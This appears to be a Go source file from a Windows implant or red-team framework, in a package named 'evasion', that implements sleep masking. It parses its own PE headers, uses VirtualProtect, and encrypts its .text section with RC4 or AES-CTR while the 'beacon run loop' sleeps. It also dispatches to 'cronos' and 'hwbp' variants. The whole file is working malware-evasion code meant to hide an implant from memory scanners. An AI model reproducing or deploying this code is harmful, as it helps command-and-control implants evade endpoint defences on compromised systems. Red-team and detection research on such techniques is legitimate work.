//go:build windows

package evasion

import (
    "fmt"
    "reflect"
    "runtime"
    "syscall"
    "time"
    "unsafe"
)

var (
    smKernel32              = syscall.NewLazyDLL("kernel32.dll")
    smProcVirtualProtect    = smKernel32.NewProc("VirtualProtect")
    smProcSleepEx           = smKernel32.NewProc("SleepEx")
    smProcGetModuleHandleW  = smKernel32.NewProc("GetModuleHandleW")
)

const (
    // PAGE_READWRITE. Deliberately not RWX. During the encryption
    // window .text is non-executable, so a thread that wakes and
    // tries to run Go code faults with an access violation
    // instead of executing garbage. See maskedSleepStub in
    // sleepmask_windows_amd64.s for how the calling thread is
    // kept out of the encrypted region.
    pageReadWrite = 0x04

    // PAGE_EXECUTE_READ — used to restore .text after both
    // encryption and decryption.
    pageExecuteRead = 0x20
)

func EncryptSelf(maskType string) (MaskKey, error) {
    var zero MaskKey
    if maskType == "" || maskType == "none" {
        return zero, nil
    }
    base, size, err := TextSection()
    if err != nil {
        return zero, fmt.Errorf("locate .text: %w", err)
    }

    const exclusionTail = 256 * 1024
    if size <= exclusionTail*2 {
        return zero, fmt.Errorf(".text too small to mask safely")
    }
    maskedSize := size - exclusionTail

    // The assembly stub maskedSleepStub is the only code that
    // runs while .text is encrypted. If it lands anywhere
    // outside the excluded tail, the CALL from MaskedSleep will
    // execute encrypted bytes and the process will fault. The
    // check below is what turns that failure into an actionable
    // error instead of an unexplained crash on the first sleep.
    stubPC := reflect.ValueOf(maskedSleepStub).Pointer()
    stubFunc := runtime.FuncForPC(stubPC)
    if stubFunc == nil || stubFunc.Entry() != stubPC {
        return zero, fmt.Errorf("cannot resolve maskedSleepStub entry")
    }
    tailStart := base + maskedSize
    tailEnd := base + size
    if stubFunc.Entry() < tailStart || stubFunc.Entry() >= tailEnd {
        return zero, fmt.Errorf(
            "maskedSleepStub at %#x is outside the excluded tail [%#x, %#x); "+
                "refusing to encrypt .text",
            stubFunc.Entry(), tailStart, tailEnd)
    }

    key := NewMaskKey(maskType)

	var oldProtect uint32
	r, _, errno := smProcVirtualProtect.Call(
		base, maskedSize, pageReadWrite,
		uintptr(unsafe.Pointer(&oldProtect)))
	if r == 0 {
		return zero, fmt.Errorf("VirtualProtect(PAGE_READWRITE): %v", errno)
	}

    data := unsafe.Slice((*byte)(unsafe.Pointer(base)), maskedSize)
    switch maskType {
    case "rc4":
        RC4Crypt(data, key.Key)
    case "aes-ctr":
        if err := AESCTRCrypt(data, key.Key); err != nil {
            return zero, err
        }
    default:
        return zero, fmt.Errorf("unknown sleep mask %q", maskType)
    }

    var dummy uint32
    r, _, errno = smProcVirtualProtect.Call(
        base, maskedSize, pageExecuteRead,
        uintptr(unsafe.Pointer(&dummy)))
    if r == 0 {
        return zero, fmt.Errorf(
            "VirtualProtect(PAGE_EXECUTE_READ) after encrypt: %v", errno)
    }

    // Re-check that the mode we are about to hand back has a
    // matching branch in DecryptSelf. A mismatch here would
    // corrupt .text on the decrypt pass; refusing at this point
    // leaves .text encrypted and the process unrecoverable, but
    // a loud error beats a silent corruption.
    switch key.Mode {
    case "rc4", "aes-ctr":
    default:
        return zero, fmt.Errorf(
            "EncryptSelf produced a mode %q with no DecryptSelf branch", key.Mode)
    }

    return key, nil
}

func DecryptSelf(key MaskKey) error {
    if key.Key == nil {
        return nil
    }
    base, size, err := TextSection()
    if err != nil {
        return err
    }
    const exclusionTail = 256 * 1024
    if size <= exclusionTail*2 {
        return fmt.Errorf(".text too small to mask safely")
    }
    maskedSize := size - exclusionTail

	var oldProtect uint32
	r, _, errno := smProcVirtualProtect.Call(
		base, maskedSize, pageReadWrite,
		uintptr(unsafe.Pointer(&oldProtect)))
	if r == 0 {
		return fmt.Errorf("VirtualProtect(PAGE_READWRITE): %v", errno)
	}

    data := unsafe.Slice((*byte)(unsafe.Pointer(base)), maskedSize)
    switch key.Mode {
    case "rc4":
        RC4Crypt(data, key.Key)
    case "aes-ctr":
        if err := AESCTRCrypt(data, key.Key); err != nil {
            return err
        }
    default:
        return fmt.Errorf("unknown sleep mask %q", key.Mode)
    }

    var dummy uint32
    r, _, errno = smProcVirtualProtect.Call(
        base, maskedSize, pageExecuteRead,
        uintptr(unsafe.Pointer(&dummy)))
    if r == 0 {
        return fmt.Errorf(
            "VirtualProtect(PAGE_EXECUTE_READ) after decrypt: %v", errno)
    }
    return nil
}

func maskedSleepStub(sleepExAddr uintptr, ms uint32)

// MaskedSleep is the single entry point the beacon run loop calls.
// The dispatcher routes rc4 and aes-ctr to the existing basic mask,
// cronos and hwbp to their own files, and refuses ekko explicitly
// so the name never silently degrades to AES-CTR.
func MaskedSleep(maskType string, ms uint32) error {
    switch maskType {
    case "", "none":
        time.Sleep(time.Duration(ms) * time.Millisecond)
        return nil
    case "rc4", "aes-ctr":
        return maskedSleepBasic(maskType, ms)
    case "cronos":
        return maskedSleepCronos(ms)
    case "hwbp":
        return maskedSleepHWBP(ms)
    case "ekko":
        return fmt.Errorf(
            "sleep mask %q is not implemented; use 'cronos' or 'hwbp'",
            maskType)
    default:
        return fmt.Errorf("unknown sleep mask %q", maskType)
    }
}

// maskedSleepBasic is the pre-existing rc4/aes-ctr path, renamed to
// make room for the dispatcher above. Body unchanged.
func maskedSleepBasic(maskType string, ms uint32) error {
    runtime.LockOSThread()
    defer runtime.UnlockOSThread()

    if err := smProcSleepEx.Find(); err != nil {
        return fmt.Errorf("resolve SleepEx: %w", err)
    }
    sleepExAddr := smProcSleepEx.Addr()

    key, err := EncryptSelf(maskType)
    if err != nil {
        return err
    }

    maskedSleepStub(sleepExAddr, ms)

    return DecryptSelf(key)
}

func TextSection() (uintptr, uintptr, error) {
    base, _, _ := smProcGetModuleHandleW.Call(0)
    if base == 0 {
        return 0, 0, syscall.EINVAL
    }
    eLfanew := *(*uint32)(unsafe.Pointer(base + 0x3C))
    peHeader := base + uintptr(eLfanew)

    numSections := *(*uint16)(unsafe.Pointer(peHeader + 6))
    sizeOfOptHdr := *(*uint16)(unsafe.Pointer(peHeader + 20))
    sectionTable := peHeader + 24 + uintptr(sizeOfOptHdr)

    for i := uintptr(0); i < uintptr(numSections); i++ {
        sect := sectionTable + i*40
        nameBytes := (*[8]byte)(unsafe.Pointer(sect))
        var name string
        for _, b := range nameBytes {
            if b == 0 {
                break
            }
            name += string(b)
        }
        if name != ".text" {
            continue
        }
        virtualSize := *(*uint32)(unsafe.Pointer(sect + 8))
        virtualAddr := *(*uint32)(unsafe.Pointer(sect + 12))
        return base + uintptr(virtualAddr), uintptr(virtualSize), nil
    }
    return 0, 0, syscall.EINVAL
}